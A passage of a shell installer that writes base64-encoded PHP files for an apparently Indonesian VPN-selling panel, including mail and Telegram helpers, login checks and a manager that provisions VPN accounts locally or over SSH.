bmRNZXNzYWdlIjsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHRfYXJyYXkoJGNoLFtDVVJMT1BUX1VSTD0+JHVybCxDVVJMT1BUX1BPU1Q9PnRydWUsCiAgICAgICAgQ1VSTE9QVF9QT1NURklFTERTPT5odHRwX2J1aWxkX3F1ZXJ5KFsnY2hhdF9pZCc9PiRjaGF0SWQsJ3RleHQnPT4kbWVzc2FnZSwncGFyc2VfbW9kZSc9PidIVE1MJ10pLAogICAgICAgIENVUkxPUFRfUkVUVVJOVFJBTlNGRVI9PnRydWUsQ1VSTE9QVF9USU1FT1VUPT41XSk7CiAgICBjdXJsX2V4ZWMoJGNoKTsgY3VybF9jbG9zZSgkY2gpOwp9CgpmdW5jdGlvbiBzZW5kRW1haWwoJHRvLCAkc3ViamVjdCwgJGh0bWxCb2R5KSB7CiAgICAkc210cEhvc3QgPSBnZXRTZXR0aW5nKCdzbXRwX2hvc3QnLCdzbXRwLmdtYWlsLmNvbScpOwogICAgJHNtdHBQb3J0ID0gKGludClnZXRTZXR0aW5nKCdzbXRwX3BvcnQnLDU4Nyk7CiAgICAkc210cFVzZXIgPSBnZXRTZXR0aW5nKCdzbXRwX3VzZXInKTsKICAgICRzbXRwUGFzcyA9IGdldFNldHRpbmcoJ3NtdHBfcGFzcycpOwogICAgJHNtdHBGcm9tID0gZ2V0U2V0dGluZygnc210cF9mcm9tJykgPzogJHNtdHBVc2VyOwogICAgJGFwcE5hbWUgID0gZ2V0U2V0dGluZygnYXBwX25hbWUnLCdPcmRlclZQTicpOwoKICAgIGlmIChlbXB0eSgkc210cFVzZXIpIHx8IGVtcHR5KCRzbXRwUGFzcykpIHJldHVybiBmYWxzZTsKCiAgICAvLyBVc2UgUEhQTWFpbGVyLWNvbXBhdGlibGUgcmF3IFNNVFAgdmlhIGZzb2Nrb3BlbgogICAgJGJvdW5kYXJ5ID0gbWQ1KHRpbWUoKSk7CiAgICAkaGVhZGVycyAgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKICAgICRoZWFkZXJzIC49ICJDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOFxyXG4iOwogICAgJGhlYWRlcnMgLj0gIkZyb206IHskYXBwTmFtZX0gPHskc210cEZyb219PlxyXG4iOwogICAgJGhlYWRlcnMgLj0gIlRvOiB7JHRvfVxyXG4iOwogICAgJGhlYWRlcnMgLj0gIlN1YmplY3Q6IHskc3ViamVjdH1cclxuIjsKCiAgICAvLyBVc2UgbWFpbCgpIGFzIGZhbGxiYWNrIOKAlCB3b3JrcyBpZiBzZW5kbWFpbCBjb25maWd1cmVkCiAgICAvLyBGb3IgR21haWwgU01UUCwgdXNlIHByb2Nfb3BlbiB3aXRoIGN1cmwKICAgICRjbWQgPSBzcHJpbnRmKAogICAgICAgICdjdXJsIC0tdXJsICJzbXRwOi8vJXM6JWQiIC0tc3NsLXJlcWQgLS1tYWlsLWZyb20gIiVzIiAtLW1haWwtcmNwdCAiJXMiIC0tdXNlciAiJXM6JXMiIC1UIC0gMj4vZGV2L251bGwnLAogICAgICAgIGVzY2FwZXNoZWxsYXJnKCRzbXRwSG9zdCksICRzbXRwUG9ydCwKICAgICAgICBlc2NhcGVzaGVsbGFyZygkc210cEZyb20pLCBlc2NhcGVzaGVsbGFyZygkdG8pLAogICAgICAgIGVzY2FwZXNoZWxsYXJnKCRzbXRwVXNlciksIGVzY2FwZXNoZWxsYXJnKCRzbXRwUGFzcykKICAgICk7CiAgICAkbXNnICA9ICJGcm9tOiB7JGFwcE5hbWV9IDx7JHNtdHBGcm9tfT5cclxuIjsKICAgICRtc2cgLj0gIlRvOiB7JHRvfVxyXG4iOwogICAgJG1zZyAuPSAiU3ViamVjdDogeyRzdWJqZWN0fVxyXG4iOwogICAgJG1zZyAuPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKICAgICRtc2cgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04XHJcblxyXG4iOwogICAgJG1zZyAuPSAkaHRtbEJvZHk7CgogICAgJGRlc2MgPSBbMD0+WydwaXBlJywnciddLDE9PlsncGlwZScsJ3cnXSwyPT5bJ3BpcGUnLCd3J11dOwogICAgJHByb2MgPSBwcm9jX29wZW4oJGNtZCwgJGRlc2MsICRwaXBlcyk7CiAgICBpZiAoaXNfcmVzb3VyY2UoJHByb2MpKSB7CiAgICAgICAgZndyaXRlKCRwaXBlc1swXSwgJG1zZyk7CiAgICAgICAgZmNsb3NlKCRwaXBlc1swXSk7CiAgICAgICAgZmNsb3NlKCRwaXBlc1sxXSk7CiAgICAgICAgZmNsb3NlKCRwaXBlc1syXSk7CiAgICAgICAgJGNvZGUgPSBwcm9jX2Nsb3NlKCRwcm9jKTsKICAgICAgICByZXR1cm4gJGNvZGUgPT09IDA7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCmZ1bmN0aW9uIHJlcXVpcmVMb2dpbigpIHsKICAgIGlmIChzZXNzaW9uX3N0YXR1cygpPT09UEhQX1NFU1NJT05fTk9ORSkgc2Vzc2lvbl9zdGFydCgpOwogICAgaWYgKCFpc3NldCgkX1NFU1NJT05bJ3VzZXJfaWQnXSkpIHsKICAgICAgICBpZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddPz8nJywnL2FwaS8nKSE9PWZhbHNlKSB7CiAgICAgICAgICAgIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyk7CiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nVW5hdXRob3JpemVkJ10pOyBleGl0OwogICAgICAgIH0KICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvb3JkZXJ2cG4vJyk7IGV4aXQ7CiAgICB9CiAgICAvLyBSZWZyZXNoIHNhbGRvCiAgICB0cnkgewogICAgICAgICRkYiA9IGdldERCKCk7CiAgICAgICAgJHMgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBzYWxkbyxpc192ZXJpZmllZCBGUk9NIHVzZXJzIFdIRVJFIGlkPT8iKTsKICAgICAgICAkcy0+ZXhlY3V0ZShbJF9TRVNTSU9OWyd1c2VyX2lkJ11dKTsKICAgICAgICAkdSA9ICRzLT5mZXRjaCgpOwogICAgICAgIGlmICgkdSkgJF9TRVNTSU9OWydzYWxkbyddID0gJHVbJ3NhbGRvJ107CiAgICB9IGNhdGNoKEV4Y2VwdGlvbiAkZSl7fQogICAgcmV0dXJuICRfU0VTU0lPTjsKfQoKZnVuY3Rpb24gcmVxdWlyZUFkbWluKCkgewogICAgJHMgPSByZXF1aXJlTG9naW4oKTsKICAgIGlmICgoJHNbJ3JvbGUnXT8/JycpICE9PSAnYWRtaW4nKSB7CiAgICAgICAgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2Rhc2hib2FyZC5waHAnKTsgZXhpdDsKICAgIH0KICAgIHJldHVybiAkczsKfQo=" | base64 -d > "$DIR"/includes/config.php
    # includes/vpn_manager.php
    echo "PD9waHAKLy8gdnBuX21hbmFnZXIucGhwIHYyLjAg4oCUIE11bHRpLVZQUyBTU0ggKyBMb2NhbCBBUEkKcmVxdWlyZV9vbmNlIF9fRElSX18uJy9jb25maWcucGhwJzsKCmNsYXNzIFZQTk1hbmFnZXIgewoKICAgIC8vIOKUgOKUgCBDUkVBVEUgdmlhIFNTSCBrZSBWUFMgdGFyZ2V0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBjcmVhdGVBY2NvdW50KCRzZXJ2ZXIsICR0eXBlLCAkdXNlcm5hbWUsICRkYXlzLCAkcXVvdGE9MTAwLCAkaXBsaW1pdD0yKSB7CiAgICAgICAgJHVzZXJuYW1lID0gcHJlZ19yZXBsYWNlKCcvW15hLXpBLVowLTlfXC1dLycsJycsICR1c2VybmFtZSk7CiAgICAgICAgaWYgKGVtcHR5KCR1c2VybmFtZSkpIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidVc2VybmFtZSB0aWRhayB2YWxpZCddOwogICAgICAgIGlmICghaW5fYXJyYXkoc3RydG9sb3dlcigkdHlwZSksWydzc2gnLCd2bWVzcycsJ3ZsZXNzJywndHJvamFuJywndHJpYWwnXSkpCiAgICAgICAgICAgIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidUaXBlIHRpZGFrIGRpZHVrdW5nJ107CgogICAgICAgICRob3N0ID0gJHNlcnZlclsnaG9zdCddID8/ICcnOwogICAgICAgICRpc0xvY2FsID0gc2VsZjo6aXNMb2NhbEhvc3QoJGhvc3QpOwoKICAgICAgICBpZiAoJGlzTG9jYWwpIHsKICAgICAgICAgICAgcmV0dXJuIHNlbGY6OmNhbGxMb2NhbEFQSSgnY3JlYXRlJywgJHR5cGUsICR1c2VybmFtZSwgJGRheXMsICRxdW90YSwgJGlwbGltaXQpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gc2VsZjo6Y2FsbFJlbW90ZVNTSCgkc2VydmVyLCAnY3JlYXRlJywgJHR5cGUsICR1c2VybmFtZSwgJGRheXMsICRxdW90YSwgJGlwbGltaXQpOwogICAgfQoKICAgIC8vIOKUgOKUgCBERUxFVEUg4oCUIGZpeDogc2VsYWx1IGhhcHVzIGRpIHNlcnZlciB0dWp1YW4g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGRlbGV0ZUFjY291bnQoJHNlcnZlciwgJHR5cGUsICR1c2VybmFtZSkgewogICAgICAgIGlmIChlbXB0eSgkdXNlcm5hbWUpKSByZXR1cm4gWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nVXNlcm5hbWUga29zb25nJ107CiAgICAgICAgJGhvc3QgPSAkc2VydmVyWydob3N0J10gPz8gJyc7CiAgICAgICAgJGlzTG9jYWwgPSBzZWxmOjppc0xvY2FsSG9zdCgkaG9zdCk7CgogICAgICAgIGlmICgkaXNMb2NhbCkgewogICAgICAgICAgICAkb3V0ID0gc2hlbGxfZXhlYyhzcHJpbnRmKCdzdWRvICVzIGRlbGV0ZSAlcyAlcyAyPiYxJywKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsY21kKFZQTl9BUElfQlJJREdFKSwKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKHN0cnRvbG93ZXIoJHR5cGUpKSwKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKCR1c2VybmFtZSkKICAgICAgICAgICAgKSk7CiAgICAgICAgICAgIHJldHVybiBqc29uX2RlY29kZSh0cmltKCRvdXQ/PycnKSwgdHJ1ZSkgPz8gWydzdWNjZXNzJz0+dHJ1ZV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBzZWxmOjpjYWxsUmVtb3RlU1NIKCRzZXJ2ZXIsICdkZWxldGUnLCAkdHlwZSwgJHVzZXJuYW1lKTsKICAgIH0KCiAgICAvLyDilIDilIAgVFJJQUwg4oCUIGJ1YXQgYWt1biAxIGphbSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gY3JlYXRlVHJpYWwoJHNlcnZlciwgJHR5cGUsICR1c2VybmFtZSkgewogICAgICAgIC8vIFRyaWFsID0gMSBqYW0sIHF1b3RhIDFHQiwgaXAgbGltaXQgMQogICAgICAgIC8vIEtpdGEgc2ltcGFuIHNlYmFnYWkgMSBoYXJpIGRpIHNlcnZlciwgZXhwaXJ5IGRpIERCID0gMSBqYW0gZGFyaSBzZWthcmFuZwogICAgICAgIHJldHVybiBzZWxmOjpjcmVhdGVBY2NvdW50KCRzZXJ2ZXIsICR0eXBlLCAkdXNlcm5hbWUsIDEsIDEsIDEpOwogICAgfQoKICAgIC8vIOKUgOKUgCBTVEFUVVMgU0VSVkVSIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBjaGVja1NlcnZlclN0YXR1cygkc2VydmVyKSB7CiAgICAgICAgJGhvc3QgPSAkc2VydmVyWydob3N0J10gPz8gJyc7CiAgICAgICAgJHBvcnQgPSAkc2VydmVyWydwb3J0J10gPz8gMjI7CiAgICAgICAgaWYgKHNlbGY6OmlzTG9jYWxIb3N0KCRob3N0KSkgewogICAgICAgICAgICAkb3V0ID0gc2hlbGxfZXhlYygnc3VkbyAnLlZQTl9BUElfQlJJREdFLicgc3RhdHVzIDI+L2Rldi9udWxsJyk7CiAgICAgICAgICAgICRyID0ganNvbl9kZWNvZGUodHJpbSgkb3V0Pz8nJyksIHRydWUpOwogICAgICAgICAgICByZXR1cm4gKCRyWyd4cmF5J10/PycnKSA9PT0gJ2FjdGl2ZScgPyAncmVhZHknIDogJ29mZmxpbmUnOwogICAgICAgIH0KICAgICAgICAvLyBDZWsgcG9ydCBTU0ggcmVtb3RlCiAgICAgICAgJGNvbm4gPSBAZnNvY2tvcGVuKCRob3N0LCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCA1KTsKICAgICAgICBpZiAoJGNvbm4pIHsgZmNsb3NlKCRjb25uKTsgcmV0dXJuICdyZWFkeSc7IH0KICAgICAgICByZXR1cm4gJ29mZmxpbmUnOwogICAgfQoKICAgIC8vIOKUgOKUgCBQUk9DRVNTIEVYUElSRUQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHByb2Nlc3NFeHBpcmVkQWNjb3VudHMoKSB7CiAgICAgICAgJGRiID0gZ2V0REIoKTsKICAgICAgICAvLyBUcmlhbCBkYW4gYWt1biBiaWFzYSB5YW5nIHN1ZGFoIGV4cGlyZWQKICAgICAgICAkc3RtdCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIHZhLiosIHMuaG9zdCwgcy5wb3J0LCBzLnNzaF91c2VyLCBzLnNzaF9wYXNzd29yZCwgcy5zc2hfa2V5IAogICAgICAgICAgICBGUk9NIHZwbl9hY2NvdW50cyB2YSAKICAgICAgICAgICAgSk9JTiBzZXJ2ZXJzIHMgT04gdmEuc2VydmVyX2lkID0gcy5pZCAKICAgICAgICAgICAgV0hFUkUgdmEubWFzYV9ha3RpZiA8IE5PVygpIEFORCB2YS5zdGF0dXMgPSAnYWN0aXZlJyIpOwogICAgICAgICRzdG10LT5leGVjdXRlKCk7CiAgICAgICAgJGV4cGlyZWQgPSAkc3RtdC0+ZmV0Y2hBbGwoKTsKICAgICAgICAkY291bnQgPSAwOwogICAgICAgIGZvcmVhY2ggKCRleHBpcmVkIGFzICRhY2MpIHsKICAgICAgICAgICAgc2VsZjo6ZGVsZXRlQWNjb3VudCgkYWNjLCAkYWNjWyd0aXBlJ10sICRhY2NbJ3VzZXJuYW1lJ10pOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB2cG5fYWNjb3VudHMgU0VUIHN0YXR1cz0nZXhwaXJlZCcgV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskYWNjWydpZCddXSk7CiAgICAgICAgICAgICRjb3VudCsrOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGNvdW50OwogICAgfQoKICAgIC8vIOKUgOKUgCBQUklWQVRFOiBDZWsgYXBha2FoIGhvc3QgPSBsb2thbCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIHByaXZhdGUgc3RhdGljIGZ1bmN0aW9uIGlzTG9jYWxIb3N0KCRob3N0KSB7CiAgICAgICAgJGxvY2FsID0gWydsb2NhbGhvc3QnLCcxMjcuMC4wLjEnLCc6OjEnXTsKICAgICAgICBpZiAoaW5fYXJyYXkoJGhvc3QsICRsb2NhbCkpIHJldHVybiB0cnVlOwogICAgICAgIC8vIEJhbmRpbmdrYW4gZGVuZ2FuIElQIHNlbmRpcmkKICAgICAgICAkbXlJUCA9IHRyaW0oc2hlbGxfZXhlYygnY3VybCAtcyAtLW1heC10aW1lIDMgaWZjb25maWcubWUgMj4vZGV2L251bGwnKSA/OiAnJyk7CiAgICAgICAgaWYgKCFlbXB0eSgkbXlJUCkgJiYgJGhvc3QgPT09ICRteUlQKSByZXR1cm4gdHJ1ZTsKICAgICAgICAkbXlJUExvY2FsID0gdHJpbShzaGVsbF9leGVjKCJob3N0bmFtZSAtSSB8IGF3ayAne3ByaW50IFwkMX0nIDI+L2Rldi9udWxsIikgPzogJycpOwogICAgICAgIGlmICghZW1wdHkoJG15SVBMb2NhbCkgJiYgJGhvc3QgPT09ICRteUlQTG9jYWwpIHJldHVybiB0cnVlOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICAvLyDilIDilIAgUFJJVkFURTogUGFuZ2dpbCBsb2thbCB2cG4tYXBpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gY2FsbExvY2FsQVBJKCRhY3Rpb24sICR0eXBlLCAkdXNlcm5hbWUsICRkYXlzPTAsICRxdW90YT0xMDAsICRpcGxpbWl0PTEpIHsKICAgICAgICBpZiAoIWlzX2V4ZWN1dGFibGUoVlBOX0FQSV9CUklER0UpICYmICFmaWxlX2V4aXN0cyhWUE5fQVBJX0JSSURHRSkpCiAgICAgICAgICAgIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9Pid2cG4tYXBpIGJyaWRnZSB0aWRhayBkaXRlbXVrYW4nXTsKCiAgICAgICAgJGNtZCA9IHNwcmludGYoJ3N1ZG8gJXMgJXMgJXMgJXMgJWQgJWQgJWQgMj4mMScsCiAgICAgICAgICAgIGVzY2FwZXNoZWxsY21kKFZQTl9BUElfQlJJREdFKSwKICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJGFjdGlvbiksCiAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKHN0cnRvbG93ZXIoJHR5cGUpKSwKICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHVzZXJuYW1lKSwKICAgICAgICAgICAgKGludCkkZGF5cywgKGludCkkcXVvdGEsIChpbnQpJGlwbGltaXQKICAgICAgICApOwogICAgICAgICRvdXRwdXQgPSBzaGVsbF9leGVjKCRjbWQpOwogICAgICAgIGlmIChlbXB0eSgkb3V0cHV0KSkgcmV0dXJuIFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J1RpZGFrIGFkYSBvdXRwdXQgZGFyaSB2cG4tYXBpJ107CiAgICAgICAgJHJlc3VsdCA9IGpzb25fZGVjb2RlKHRyaW0oJG91dHB1dCksIHRydWUpOwogICAgICAgIGlmICghaXNfYXJyYXkoJHJlc3VsdCkpIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidPdXRwdXQgdGlkYWsgdmFsaWQ6ICcuc3Vic3RyKCRvdXRwdXQsMCwzMDApXTsKICAgICAgICBpZiAoIWVtcHR5KCRyZXN1bHRbJ3N1Y2Nlc3MnXSkpIHsKICAgICAgICAgICAgJHJlc3VsdFsnbGlua19jb25maWcnXSA9ICRyZXN1bHRbJ2xpbmtfdGxzJ10gPz8gJHJlc3VsdFsnbGlua19jb25maWcnXSA/PyAnJzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CgogICAgLy8g4pSA4pSAIFBSSVZBVEU6IFNTSCBrZSBWUFMgcmVtb3RlIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gY2FsbFJlbW90ZVNTSCgkc2VydmVyLCAkYWN0aW9uLCAkdHlwZSwgJHVzZXJuYW1lLCAkZGF5cz0wLCAkcXVvdGE9MTAwLCAkaXBsaW1pdD0xKSB7CiAgICAgICAgJGhvc3QgICAgPSAkc2VydmVyWydob3N0J107CiAgICAgICAgJHBvcnQgICAgPSAkc2VydmVyWydwb3J0J10gPz8gMjI7CiAgICAgICAgJHNzaFVzZXIgPSAkc2VydmVyWydzc2hfdXNlciddID8/ICdyb290JzsKICAgICAgICAkc3NoS2V5ICA9ICRzZXJ2ZXJbJ3NzaF9rZXknXSA/PyBTU0hfS0VZX1BBVEg7CiAgICAgICAgJHNzaFBhc3MgPSAkc2VydmVyWydzc2hfcGFzc3dvcmQnXSA/PyAnJzsKCiAgICAgICAgLy8gQnVpbGQgcmVtb3RlIGNvbW1hbmQg4oCUIHBhbmdnaWwgdnBuLWFwaSBkaSBWUFMgcmVtb3RlCiAgICAgICAgaWYgKCRhY3Rpb24gPT09ICdjcmVhdGUnKSB7CiAgICAgICAgICAgICRyZW1vdGVDbWQgPSBzcHJpbnRmKCdzdWRvIC91c3IvbG9jYWwvYmluL3Zwbi1hcGkgY3JlYXRlICVzICVzICVkICVkICVkIDI+JjEnLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoc3RydG9sb3dlcigkdHlwZSkpLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHVzZXJuYW1lKSwKICAgICAgICAgICAgICAgIChpbnQpJGRheXMsIChpbnQpJHF1b3RhLCAoaW50KSRpcGxpbWl0CiAgICAgICAgICAgICk7CiAgICAgICAgfSBlbHNlaWYgKCRhY3Rpb24gPT09ICdkZWxldGUnKSB7CiAgICAgICAgICAgICRyZW1vdGVDbWQgPSBzcHJpbnRmKCdzdWRvIC91c3IvbG9jYWwvYmluL3Zwbi1hcGkgZGVsZXRlICVzICVzIDI+JjEnLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoc3RydG9sb3dlcigkdHlwZSkpLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHVzZXJuYW1lKQogICAgICAgICAgICApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRyZW1vdGVDbWQgPSAnc3VkbyAvdXNyL2xvY2FsL2Jpbi92cG4tYXBpIHN0YXR1cyAyPiYxJzsKICAgICAgICB9CgogICAgICAgIC8vIENvYmEgcGFrYWkgU1NIIGtleSBkdWx1LCBmYWxsYmFjayBrZSBzc2hwYXNzIGppa2EgYWRhIHBhc3N3b3JkCiAgICAgICAgaWYgKCFlbXB0eSgkc3NoS2V5KSAmJiBmaWxlX2V4aXN0cygkc3NoS2V5KSkgewogICAgICAgICAgICAkc3NoQ21kID0gc3ByaW50ZigKICAgICAgICAgICAgICAgICdzc2ggLWkgJXMgLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTE1IC1vIEJhdGNoTW9kZT15ZXMgLXAgJWQgJXNAJXMgJXMgMj4mMScsCiAgICAgICAgICAgICAgICBlc2NhcGVzaGVsbGFyZygkc3NoS2V5KSwgKGludCkkcG9ydCwKICAgICAgICAgICAgICAgIGVzY2FwZXNoZWxsYXJnKCRzc2hVc2VyKSwgZXNjYXBlc2hlbGxhcmcoJGhvc3QpLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHJlbW90ZUNtZCkKICAgICAgICAgICAgKTsKICAgICAgICB9IGVsc2VpZiAoIWVtcHR5KCRzc2hQYXNzKSAmJiBzaGVsbF9leGVjKCd3aGljaCBzc2hwYXNzIDI+L2Rldi9udWxsJykpIHsKICAgICAgICAgICAgJHNzaENtZCA9IHNwcmludGYoCiAgICAgICAgICAgICAgICAnc3NocGFzcyAtcCAlcyBzc2ggLW8gU3RyaWN0SG9zdEtleUNoZWNraW5nPW5vIC1vIENvbm5lY3RUaW1lb3V0PTE1IC1wICVkICVzQCVzICVzIDI+JjEnLAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHNzaFBhc3MpLCAoaW50KSRwb3J0LAogICAgICAgICAgICAgICAgZXNjYXBlc2hlbGxhcmcoJHNzaFVzZXIpLCBlc2NhcGVzaGVsbGFyZygkaG9zdCksCiAgICAgICAgICAgICAgICBlc2NhcGVzaGVsbGFyZygkcmVtb3RlQ21kKQogICAgICAgICAgICApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBbJ3N1Y2Nlc3MnPT5mYWxzZSwnbWVzc2FnZSc9PidUaWRhayBhZGEgU1NIIGtleSBhdGF1IHNzaHBhc3MgdW50dWsga29uZWtzaSBrZSAnLiRob3N0XTsKICAgICAgICB9CgogICAgICAgIGV4ZWMoJHNzaENtZCwgJG91dHB1dEFyciwgJGV4aXRDb2RlKTsKICAgICAgICAkb3V0cHV0ID0gaW1wbG9kZSgiXG4iLCAkb3V0cHV0QXJyKTsKCiAgICAgICAgaWYgKCRleGl0Q29kZSAhPT0gMCkgewogICAgICAgICAgICByZXR1cm4gWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nU1NIIGdhZ2FsIChleGl0ICcuJGV4aXRDb2RlLicpOiAnLnN1YnN0cigkb3V0cHV0LDAsMzAwKV07CiAgICAgICAgfQoKICAgICAgICAvLyBDYXJpIGJhcmlzIEpTT04gZGkgb3V0cHV0CiAgICAgICAgJGpzb25MaW5lID0gJyc7CiAgICAgICAgZm9yZWFjaCAoYXJyYXlfcmV2ZXJzZSgkb3V0cHV0QXJyKSBhcyAkbGluZSkgewogICAgICAgICAgICAkbGluZSA9IHRyaW0oJGxpbmUpOwogICAgICAgICAgICBpZiAoc3RycG9zKCRsaW5lLCd7Jyk9PT0wKSB7ICRqc29uTGluZT0kbGluZTsgYnJlYWs7IH0KICAgICAgICB9CgogICAgICAgICRyZXN1bHQgPSBqc29uX2RlY29kZSgkanNvbkxpbmUsIHRydWUpOwogICAgICAgIGlmICghaXNfYXJyYXkoJHJlc3VsdCkpIHsKICAgICAgICAgICAgLy8gU1NIIGJlcmhhc2lsIHRhcGkgb3V0cHV0IGJ1a2FuIEpTT04g4oCUIGFuZ2dhcCBzdWtzZXMgdW50dWsgZGVsZXRlCiAgICAgICAgICAgIGlmICgkYWN0aW9uPT09J2RlbGV0ZScpIHJldHVybiBbJ3N1Y2Nlc3MnPT50cnVlLCdtZXNzYWdlJz0+J0RlbGV0ZWQnXTsKICAgICAgICAgICAgcmV0dXJuIFsnc3VjY2Vzcyc9PmZhbHNlLCdtZXNzYWdlJz0+J091dHB1dCB0aWRhayB2YWxpZCBkYXJpIHJlbW90ZTogJy5zdWJzdHIoJG91dHB1dCwwLDMwMCldOwogICAgICAgIH0KICAgICAgICBpZiAoIWVtcHR5KCRyZXN1bHRbJ3N1Y2Nlc3MnXSkpIHsKICAgICAgICAgICAgJHJlc3VsdFsnbGlua19jb25maWcnXSA9ICRyZXN1bHRbJ2xpbmtfdGxzJ10gPz8gJHJlc3VsdFsnbGlua19jb25maWcnXSA/PyAnJzsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9Cn0K" | base64 -d > "$DIR"/includes/vpn_manager.php
    # index.php
    echo "PD9waHAKcmVxdWlyZV9vbmNlIF9fRElSX18uJy9pbmNsdWRlcy9jb25maWcucGhwJzsKaWYgKHNlc3Npb25fc3RhdHVzKCk9PT1QSFBfU0VTU0lPTl9OT05FKSBzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX1NFU1NJT05bJ3VzZXJfaWQnXSkpIHsgaGVhZGVyKCdMb2NhdGlvbjogL29yZGVydnBuL2Rhc2hib2FyZC5waHAnKTsgZXhpdDsgfQoKJGFwcE5hbWUgPSBnZXRTZXR0aW5nKCdhcHBfbmFtZScsJ09yZGVyVlBOJyk7CiRlcnJvciA9ICcnOyAkc3VjY2VzcyA9ICcnOwoKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddPT09J1BPU1QnKSB7CiAgICAkYWN0aW9uID0gJF9QT1NUWydhY3Rpb24nXSA/PyAnJzsKCiAgICBpZiAoJGFjdGlvbj09PSdsb2dpbicpIHsKICAgICAgICAkdSA9IHNhbml0aXplKCRfUE9TVFsndXNlcm5hbWUnXT8/JycpOwogICAgICAgICRwID0gJF9QT1NUWydwYXNzd29yZCddPz8nJzsKICAgICAgICBpZiAoZW1wdHkoJHUpfHxlbXB0eSgkcCkpIHsgJGVycm9yPSdVc2VybmFtZSBkYW4gcGFzc3dvcmQgd2FqaWIgZGlpc2khJzsgf